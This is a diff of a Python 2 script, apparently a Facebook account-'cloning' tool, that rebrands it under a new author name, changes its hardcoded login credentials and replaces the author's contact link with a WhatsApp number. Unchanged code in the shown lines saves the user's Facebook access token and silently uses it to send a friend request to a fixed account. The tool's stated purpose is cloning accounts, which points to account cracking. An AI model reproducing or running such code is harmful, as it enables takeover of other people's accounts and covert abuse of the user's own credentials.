@@ -50,21 +50,21 @@ def jalan(z):
 logo = """
 \033[1;91m       ♦♦♦—————————————————————————————————————————♦♦♦
 
-\033[1;97m ██╗░░░██╗██╗░░░░░████████╗██╗███╗░░░███╗░█████╗░████████╗███████╗
-\033[1;92m ██║░░░██║██║░░░░░╚══██╔══╝██║████╗░████║██╔══██╗╚══██╔══╝██╔════╝
-\033[1;91m ██║░░░██║██║░░░░░░░░██║░░░██║██╔████╔██║███████║░░░██║░░░█████╗░░
-\033[1;96m ██║░░░██║██║░░░░░░░░██║░░░██║██║╚██╔╝██║██╔══██║░░░██║░░░██╔══╝░░
-\033[1;92m ╚██████╔╝███████╗░░░██║░░░██║██║░╚═╝░██║██║░░██║░░░██║░░░███████╗
-\033[1;91m ░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
-\033[1;96m AUTHOR  : HAUNTERBOY ALAMIN✔ 
-\033[1;96m FACEBOOK: MD ALAMIN KHAN
-\033[1;96m CONTACT: https://www.facebook.com/alaminkhan.60                  
+\033[1;97m ╭━━╮╭━━━┳╮╱╱╭━━━┳━━━┳╮╱╭╮
+\033[1;92m ┃╭╮┃┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╱┃┃
+\033[1;91m ┃╰╯╰┫┃╱┃┃┃╱╱┃┃╱┃┃┃╱╰┫╰━╯┃
+\033[1;96m ┃╭━╮┃╰━╯┃┃╱╭┫┃╱┃┃┃╱╭┫╭━╮┃
+\033[1;92m ┃╰━╯┃╭━╮┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃
+\033[1;91m ╰━━━┻╯╱╰┻━━━┻━━━┻━━━┻╯╱╰╯
+\033[1;96m AUTHOR  : THE PROFESSIONAL SULTAN✔ 
+\033[1;96m FACEBOOK: SULTAN AHMED
+\033[1;96m CONTACT: https://www.facebook.com/MEERSULTAN.KHOSO                  
 \033[1;91m       ♦♦♦—————————————————————————————————————————♦♦♦
 """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[1;93mPlease Intizar karo \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -80,12 +80,12 @@ os.system("clear")
 print  """
 
 
-\033[1;97m ██╗░░██╗░█████╗░██╗░░░██╗███╗░░██╗████████╗███████╗██████╗░ 
-\033[1;91m ██║░░██║██╔══██╗██║░░░██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗ 
-\033[1;92m ███████║███████║██║░░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝ 
-\033[1;96m ██╔══██║██╔══██║██║░░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗ 
-\033[1;91m ██║░░██║██║░░██║╚██████╔╝██║░╚███║░░░██║░░░███████╗██║░░██║ 
-\033[1;91m ╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝ 
+\033[1;97m ░██████╗██╗░░░██╗██╗░░░░░████████╗░█████╗░███╗░░██╗
+\033[1;91m ██╔════╝██║░░░██║██║░░░░░╚══██╔══╝██╔══██╗████╗░██║
+\033[1;92m ╚█████╗░██║░░░██║██║░░░░░░░░██║░░░███████║██╔██╗██║
+\033[1;96m ░╚═══██╗██║░░░██║██║░░░░░░░░██║░░░██╔══██║██║╚████║
+\033[1;91m ██████╔╝╚██████╔╝███████╗░░░██║░░░██║░░██║██║░╚███║
+\033[1;91m ╚═════╝░░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝
 
 \033[1;96m•◈•────────────────•◈ ITS NOT A NAME ITS BRAND •◈•────────────────•◈•  
 
@@ -132,13 +132,13 @@ print  """
 """
 jalan(" \033[1;91m WI-FI USERZ USE ANY PROXY ")
 jalan(" \033[1;91m BANGLADESHI USERZ USE U.S. PROXY ")	 
-jalan(" \033[1;91m AUTHER   : HAUNTERBOY ALAMIN✔")	 
-jalan(" \033[1;93m FACEBOOK : MD ALAMIN KHAN") 
-jalan(" \033[1;93m Welcome to ULTIMATE TOOL ") 
-jalan("\033[1;97m•◈•──────────────────────•◈•\033[1;96mHAUNTERBOY\033[1;96m•◈•────────────────────•◈•") 
+jalan(" \033[1;91m AUTHER   : THE PROFESSIONAL SULTAN✔")	 
+jalan(" \033[1;93m FACEBOOK : SULTAN AHMED") 
+jalan(" \033[1;93m Welcome to BALOCH TOOL ") 
+jalan("\033[1;97m•◈•──────────────────────•◈•\033[1;96mTHEPROFESSIONAL\033[1;96m•◈•────────────────────•◈•") 
 
-CorrectUsername = "ALAMIN" 
-CorrectPassword = "KHan" 
+CorrectUsername = "MERI" 
+CorrectPassword = "JAAN" 
 
 
 loop = 'true'
@@ -150,11 +150,11 @@ while (loop == 'true'):
             print "Logged in successfully as " + username
             loop = 'false'
         else:
-            print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/alaminkhan.60')
+            print "ghalat Password"
+            os.system('xdg-open https://www.wa.me/+923476508876')
     else:
-        print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/alaminkhan.60')
+        print "ghalat Username"
+        os.system('xdg-open https://www.wa.me/+923476508876')
 
 def login():
 	os.system('clear')
@@ -198,7 +198,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.facebook.com/alaminkhan.60')
+				os.system('xdg-open https://www.wa.me/+923476508876')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -357,7 +357,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
 
-	jalan('  \033[1;97mULTIMATE TOOL start cloning Please Wait...')
+	jalan('  \033[1;97mBALOCH TOOL start cloning Please Wait...')
 	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
 
 	def main(arg):
